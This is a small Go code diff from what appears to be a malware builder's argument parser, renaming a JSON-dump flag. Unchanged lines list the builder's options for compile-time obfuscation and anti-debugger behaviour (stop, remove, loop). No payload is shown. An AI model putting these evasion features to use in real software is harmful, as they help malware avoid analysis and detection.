@@ -20,7 +20,7 @@ func main() {
 	arg.Argument_add_with_options("--debug", "-d", true, "Debug options, will not delete the src file after compilation", []string{"false", "true"})
 	arg.Argument_add("--output", "-o", true, "Name of the binary malware")
 	arg.Argument_add("--extension", "-e", true, "Extension of the binary malware")
-	arg.Argument_add("--json", "-j", false, "Prints the finalized json structure after compiling a file")
+	arg.Argument_add("--dump_json", "-dj", false, "Prints the finalized json structure after compiling a file")
 	arg.Argument_add("--obfuscate", "-ob", false, "Obfuscates the source code at compile time")
 	arg.Argument_add_with_options("--debugger_behavior", "-db", true, "Changes the behavior of the malware after detecting a debugger", []string{"none", "stop", "remove", "loop"})
 	arg.Argument_add("--build_directory", "-bd", true, "Sets the directory where all compiled files, source code, etc will be placed")
@@ -54,7 +54,7 @@ func main() {
 				object.Set_binary_name(value)
 			case "-e":
 				object.Set_extension(value)
-			case "-j":
+			case "-dj":
 				object.Set_dump_json()
 			case "-ob":
 				object.Enable_obfuscate()
